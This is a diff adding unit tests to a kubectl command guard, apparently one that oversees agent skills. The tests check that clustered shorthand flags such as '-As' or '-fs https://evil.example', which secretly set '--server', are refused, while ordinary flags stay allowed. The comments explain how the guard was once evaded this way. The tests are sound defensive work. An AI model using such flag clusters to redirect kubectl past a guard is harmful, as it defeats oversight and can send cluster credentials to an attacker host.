@@ -306,6 +306,50 @@ class KubectlIdentityFlagTest(unittest.TestCase):
         self.assertFalse(decision.allowed)
         self.assertEqual("kubernetes.identity-change-forbidden", decision.rule_id)
 
+    def test_a_shorthand_cluster_reaching_server_is_refused(self):
+        # pflag clusters shorthands, and the walk does not stop at a boolean:
+        # each shorthand carrying a NoOptDefVal consumes nothing and the loop
+        # continues, so the *first value-taking* shorthand in the run takes the
+        # rest of the token or the next argv element. A cluster of booleans
+        # ending in `s` is therefore `--server`, and cobra merges the root
+        # command's persistent `-s, --server` into every subcommand's flag set.
+        #
+        # The booleans below are the ones the shipped verbs actually register:
+        # `kubectl get` has -A/-R/-w, `kubectl logs` has -f/-p. Before this was
+        # closed, all three were permitted while `-s` and `-sVALUE` were
+        # refused -- the guard caught the two spellings nobody needed and
+        # missed the one that works.
+        for argv, desc in (
+            (["kubectl", "get", "pods", "-As", "http://127.0.0.1:19571"], "-A cluster"),
+            (["kubectl", "get", "pods", "-Rs", "http://127.0.0.1:19571"], "-R cluster"),
+            (["kubectl", "get", "pods", "-ws", "http://127.0.0.1:19571"], "-w cluster"),
+            (["kubectl", "logs", "mypod", "-fs", "https://evil.example"], "-f cluster on logs"),
+            (["kubectl", "get", "pods", "-Ashttp://127.0.0.1:19571"], "cluster with attached value"),
+        ):
+            with self.subTest(desc=desc):
+                decision = evaluate(argv)
+                self.assertFalse(decision.allowed, desc)
+                self.assertEqual(
+                    "kubernetes.identity-change-forbidden", decision.rule_id, desc
+                )
+                self.assertEqual("-s", decision.offending_flag, desc)
+
+    def test_a_shorthand_cluster_without_server_is_allowed(self):
+        # The over-refusal side. Widening the rule to "any single-dash token
+        # containing an s" would refuse --sort-by, --since and --selector, and
+        # a rule that refuses the flags the skills use is not a control, it is
+        # an outage. Long flags are handled by exact membership, never here.
+        for argv, desc in (
+            (["kubectl", "get", "pods", "-A"], "single boolean"),
+            (["kubectl", "logs", "mypod", "-f"], "follow"),
+            (["kubectl", "get", "pods", "-Aw"], "two booleans, no s"),
+            (["kubectl", "get", "pods", "--sort-by", ".metadata.name"], "--sort-by"),
+            (["kubectl", "get", "pods", "--selector", "app=x"], "--selector"),
+            (["kubectl", "logs", "mypod", "--since", "5m"], "--since"),
+        ):
+            with self.subTest(desc=desc):
+                self.assertTrue(evaluate(argv).allowed, desc)
+
     def test_attached_shorthand_server_is_refused(self):
         # pflag accepts a shorthand's value attached to it, so `-shttp://host`
         # is `--server http://host` with no `=` to partition on -- the token's
